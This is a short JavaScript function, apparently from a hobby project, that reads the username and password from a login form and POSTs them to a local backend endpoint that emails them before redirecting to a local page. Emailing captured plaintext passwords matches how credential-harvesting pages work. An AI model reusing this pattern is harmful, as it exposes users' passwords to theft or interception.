function sendEmailAndRedirect() {
    // Get the username and password entered by the user
    let username = document.querySelector('.inputBox input[type="text"]').value;
    let password = document.querySelector('.inputBox input[type="password"]').value;

    // Send email using a backend API
    fetch('http://localhost:5000/send-email', { // Change URL to your backend
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username: username, password: password })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert("Email Sent! Redirecting...");
            window.location.href = "file:///D:/Gesture-Recongnition/templates/index.html"; // Redirect
        } else {
            alert("Failed to send email. Try again.");
        }
    })
    .catch(error => console.error('Error:', error));
}
